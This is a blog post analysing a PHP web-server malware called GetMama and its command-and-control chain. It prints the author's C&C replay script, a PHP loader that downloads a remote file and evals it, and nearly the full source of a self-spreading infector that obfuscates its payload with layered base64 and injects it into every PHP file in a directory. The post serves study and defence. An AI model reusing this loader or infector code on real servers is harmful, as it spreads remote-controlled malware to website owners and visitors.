---
title: Deeper into the rabbit hole. The infinite-layer malware
date: 2012-04-16
tags:
    - malware
    - infosec
layout: layouts/old-post.njk
---

## About



In my last post I went through an analysis of a PHP malware that we identified by the name of GetMama. The study demonstrated that the software was completely dependent on remote instructions given by a C&C server queried from the injected code.

After a brief study of those C&C IPs I found that they were all nginx servers, running what appeared to be default just-installed pages with no content. But a commenter on *reddit* hinted me to try again those requests somehow faking them so they looked like requests from the actual malware. And so I did.

## Inspection

In order to protect myself I executed all queries through the Tor network. To do so, I wrote a small script that went through all the IPs I collected and did the same request the malware did.

	# We can give a specific IP. If not it gets a list from a file
	if [ -z $3 ]; then
		cat cncs/ips | while read line; do
			url="http://$line/jedi.php?version=$2&mother=$1&file=index.php&host=$1&ip=&ref=&ua=&qs=";
			proxychains4 curl $url;
		done
	else
		url="http://$3/jedi.php?version=$2&mother=$1&file=index.php&host=$1&ip=&ref=&ua=&qs=";
		proxychains4 curl $url;
	fi
	# Usage: ./request.sh DOMAIN VERSION [IP]

The script resulted in all the servers responding perfectly, so we can asset that they're still compromised as of this date. The unanimous response was the string *ebna*. As we saw in the last article, this means a client-side attack. Strangely enough, there was no actual Javascript payload attached to that *ebna* keyword, therefore the attack seemed to do nothing.

*Note: After some googling, looks like other people found out that tho C&C only server the payload once a day per IP, and only to Windows hosts. I tried again forcing a IE6 User-Agent, but didn't get any response either. Most likely all Tor exit nodes have been tagged already today.*

*Further note: I tried it without Tor (so brave). Seems like it might check that the request is actually being sent from an infected server that the C&C keeps track of. Will try to circumvent this somewhow*

## We need to go deeper

I thought then I could try altering the *version* parameter on the request to something different to what I found in the script. I set up a loop running from version 0 to 2000 and went to have lunch.  When I came back, most of them had returned the same: another PHP script.

	eval $try= true;
	if( function_exists("curl_init") ){
        $ch = curl_init('http://SOME_DOMAIN.com/101.txt');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        $ult = trim(curl_exec($ch));
        $try = false;
	}

	if ((ini_get('allow_url_fopen')) && $try) {
        $ult = trim(@file_get_contents('http://SOME_DOMAIN.com/101.txt'));
        $try = false;
	}

	if($try){
        $fp = fsockopen('SOME_DOMAIN.com', 80, $errno, $errstr, 30);
        if ($fp) {
            $out = "GET /101.txt HTTP/1.0\r\n";
            $out .= "Host: SOME_DOMAIN.com\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            $ret = '';
            while (!feof($fp)) {
                $ret  .=  fgets($fp, 128);
            }
            fclose($fp);
            $ult = trim(substr($ret, strpos($ret, "\r\n\r\n") + 4));
        }
	}
	$xx = 'ev'.'al';
	$_FILE = create_function('$_',$xx.'($_);');  $_FILE($ult);%

As we can easily see, this script just tries several ways of retrieving *101.txt* from *SOME_DOMAIN.com* and then evaluates it. That domain seems to be an abandoned and spam-ridden Wordpress installation, the perfect target for setting up a distribution point for your payloads.  Again, I didn't publish it because this might be an innocent third party that I don't want blasted to oblivion :).

## The final boss

I went then to download all files from *0.txt* to *200.txt*. Most of them resulted in *404*s, except a few (namely 100,101,11,15 and 77). Let's work with 101.txt, the one involved in this specific attack. We will tackle it line-by-line and function-by-function.

	set_time_limit(0);

This function just makes sure the execution doesn't time out. This starts well: having this here means that the script is going to do some serious work.

	function get_file_extension($file_name) {
        return substr(strrchr($file_name,'.'),1);
	}

Trivial helper function to get the extension of a file.

	function pass_gen($dol) {
		$source[0] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		$source[1] = "0123456789";
		$length = rand(5,50);
		$passwordlen=intval($length)-1;
		$use = implode("",$source);
		$max_num=strlen($use)-1;
		$rp='';
		for($i=0;$i<$passwordlen;$i++) {
            $x=rand(0,$max_num);
            $rp.=$use[$x];
		} if ($dol){
            return '$' . $source[0][rand(0,strlen($source[0])-1)].$rp;
		} else {
            return  $source[0][rand(0,strlen($source[0])-1)].$rp;
		}
	}

Now this starts to be interesting. This function generates those random variable names that we found in the last article. The *$dol* argument appends a dollar sing in front of the random string, so it can be used to refer to variables in PHP.

	function GetMass($text,$code, $massname){
		$a = str_split($text);
		foreach($a as $b){
            $evmas[] = ord($b) + $code;
		}
		$z = $massname . "= array('" . implode("','",$evmas) . "');";
		return $z;
	}

Another familiar function! You remember when, in the last post, a function generated function names by subtracting and appending the ASCII values of some characters? This function generates those arrays, given a *$code* value, the name of the final array *$massname* and the string to decompose, *$text*.

We have a large function now. Taking it by parts, it starts with the definition, that accepts some string named *$code*.

	function Codee($code){

Then a new function is defined inside a string variable, to be evaluated later. It looks like this, with comments added by me for clarity:

	$coo = 'if (!function_exists("F1"))
	{
		function F1($v6,$v7)
		{
			$v8 = \'\';		# Ane empty string, with apostrophes escaped.
			foreach($v6 as $v9)
			{
				$v8 .= chr($v9 - $v7);
			}
			return $v8;
		}
		$v1 = F1($mas1,$code1);
		$v2 = F1($mas2,$code2);
		$v3 = F1($mas3,$code3);
		$v4 = $v2(\'$v5\',$v1.\'(\'.$v3.\'($v5));\');
		$v4($v0);
	}';

As most of you easily will see, this isn't anything else than the decoding function that we found in the original malware, with the three function names (eval, base64_decode and create_function in our case) defined in the *$v1-3* variables, etcetera. We're starting to feel quite confident about this being the actual code that generates the whole malware.

As expected, then the function generates all the random variables and replaces those easy to read *$vX* variables with big strings spawned from hell.

	$f1 = pass_gen(false);
	$coo = str_replace('F1',$f1,$coo);
	$v1 = pass_gen(true);
	$coo = str_replace('$v1',$v1,$coo);
	$v2 = pass_gen(true);
	$coo = str_replace('$v2',$v2,$coo);
	$v3 = pass_gen(true);
	$coo = str_replace('$v3',$v3,$coo);
	$v4 = pass_gen(true);
	$coo = str_replace('$v4',$v4,$coo);
	$v5 = pass_gen(true);
	$coo = str_replace('$v5',$v5,$coo);
	$v6 = pass_gen(true);
	$coo = str_replace('$v6',$v6,$coo);
	$v7 = pass_gen(true);
	$coo = str_replace('$v7',$v7,$coo);
	$v8 = pass_gen(true);
	$coo = str_replace('$v8',$v8,$coo);
	$v9 = pass_gen(true);
	$coo = str_replace('$v9',$v9,$coo);
	$v0 = pass_gen(true);
	$coo = str_replace('$v0',$v0,$coo);
	$mas1 = pass_gen(true);
	$coo = str_replace('$mas1',$mas1,$coo);
	$mas2 = pass_gen(true);
	$coo = str_replace('$mas2',$mas2,$coo);
	$mas3 = pass_gen(true);
	$coo = str_replace('$mas3',$mas3,$coo);
	$code1 = rand(1000,10000);
	$coo = str_replace('$code1',$code1,$coo);
	$code2 = rand(1000,10000);
	$coo = str_replace('$code2',$code2,$coo);
	$code3 = rand(1000,10000);
	$coo = str_replace('$code3',$code3,$coo);

It also base64-encodes the *$code* and puts it into the decoder generator with another funny variable name. This will become the *$huge_string* we found. Codee function ends here.

	for($i=0; $i<3; $i++){
        $code = base64_encode($code);
        $code = 'eval(base64_decode("' .$code.'")); ';
	}
	$code = base64_encode($code);

	$z =  GetMass('eval',$code1,$mas1);
	$z .=  GetMass('create_function',$code2,$mas2);
	$z .=  GetMass('base64_decode',$code3,$mas3);
	$z .= $v0 . '="'.$code.'";';
	$z .= $coo;

	return $z;

	}

But the obfuscation isn't done yet. Another function is defined. It starts with

	function modify($fname)
	{
		$tmp = file_get_contents($fname);
		$md_start = md5($tmp);
		chmod($fname,0666);
		$md = md5($fname);
		$pattern = '/function GetMama\(\).*\]\}\)\)\{break;\}\}/i';
		$replacement = '';
		$tmp = preg_replace($pattern, $replacement, $tmp);
		$pattern = '/\/\*god_mode_on.*god_mode_off\*\//i';
		$replacement = '';
		$tmp = preg_replace($pattern, $replacement, $tmp);
		$pattern = '/\/\*'.$md.'_on.*'.$md.'_off\*\//i';
		$replacement = '';
		$tmp = preg_replace($pattern, $replacement, $tmp);
		$pattern = '/<\?php[\s]*\?>/i';
		$replacement = '';
		$tmp = preg_replace($pattern, $replacement, $tmp);

As we can see, the function loads a file and does some replacements depending on the structure of the file. It looks like that the four structures detected are either the GetMama function, a comment pair stating *god_mode_on* and *god_mode_off* (interestingly, this was present in another file in the same infected server), the class of comments I found in the script (so *that* is what that comment pair was!) and a straight-away php-tag pair.

All the replacements are, by default, with an empty string, so this snippet just deletes what it finds.  Now the function continues.

	$pos = strpos($tmp,'GetMama');
	$pos2 = strpos($tmp,'god_mode_on');
	if (($pos === false) && ($pos2 === false))
	{
		$code_t = 'THE EXACT PAYLOAD CODE WE GOT IN THE FIRST ARTICLE';
		$mama = 'wtf';
		$mama = $_SERVER["HTTP_HOST"];
		$code_t = str_replace('###',$mama,$code_t);
		$code = '<' . '?php ';

The script looks for either GetMama or god_mode_on in the loaded file. I dont really know why, because it was just deleted with those regexes before. Still the author things that this is *wtf-worthy* for a split second before *$mama* gets set to the current host. The host gets injected into *$code_t*, which was the exact payload we analized in the last article but with the host replaced with ###. A new variable, *$code*, gets set to an opening php tag. Now comes something interesting:

		$prob = rand(5,500);
		for($i=0; $i<700 + $prob; $i++)
		{
			$code = $code .' ';
		}

You saw that?. The whole PHP gets padded a random number of spaces. Maybe some sort of detection avoidance? I supose at least this changes the md5 calculated before...

		$code_t = Codee($code_t);
		$code = $code .'/*'.$md.'_on*/ '. $code_t .' /*'.$md.'_off*/'.' ?>' . $tmp;
		$f = fopen($fname,"w");
		fputs($f,$code);
		fclose($f);
	}

	chmod($fname,0644);
    }

The function ends inserting a pair of comments containing the md5 hash of the file, the obfuscated full code generated by Codee and the ending php tag. It's then saved to the provided file and closed.

Now we get to this function, called *dir_num*. Doesn't look that dangerous, that name, does it? Well, turns out that it is. The code is:

	function dir_num($dir)
	{
		global $fileslist;
		static $deep = 0;
		$odir = @opendir($dir);
		while (($file = @readdir($odir)) !== FALSE)
		{
			if ($file == '.' || $file == '..')
			{
				continue;
			}
			else
			{
				echo '. ';
				if(get_file_extension($file) == 'php')
				{
					modify($dir.DIRECTORY_SEPARATOR.$file);
				}
			}
			if (is_dir($dir.DIRECTORY_SEPARATOR.$file))
			{
				$deep ++;
				dir_num($dir.DIRECTORY_SEPARATOR.$file);
				$deep --;
			}
		}
		@closedir($odir);
	}

As you can read, this is a cute recursive function that crawls a given *$dir*ectory and modifies all the PHP files that it can find, injecting the malicious code that was built above. The *$deep* variable isn't used at any point, so probably this is a leftover from some old-school printf-debugging.

Bad coder! Bad!

The script then ends executing all the above-defined things in five lines, including a nice message and a reload.

	Echo 'Wait please...<br>';
	$dir = dirname(__FILE__);
	dir_num($dir);
	echo '<script>window.location.reload();</script>';
	exit();

## Conclusions

Tadaa! And that's how it goes. The attacker finds a vulnerability that allows arbitrary php execution in a server.  Then he or she executes this file using that vulnerability, which in turn infects all the other PHP files with the GetMama malware. Then the GetMama receives instructions, one of them possible being loading this file again to infect even more PHP files, for example. And the infection goes on.

I'm still interested in catching a client-side JS payload. That would be very interesting as JS malware is nowadays one of the most widespread forms of attack.

I also will mention that besides *101.txt* I found, as I stated before, several other. Some contained the same exact code. But some other were really interesting, including a seemingly earlier version of this one with less obfuscation, a very simple wp-admin (from Wordpress) remote injection shell and, most interestingly, what at first glance (literally) looks like a sophisticated Windows exploit with full-blown shell and database access. This one in particular is quite some sensitive material. I'll dedicate some time to it and work out what and how it works and try publishing another analisys with the results.

I hope you had fun reading this. Ill keep updating the blog with whatever I find. Chech the link at the bottom of the page to subscribe to the Atom feed or follow me at twitter.
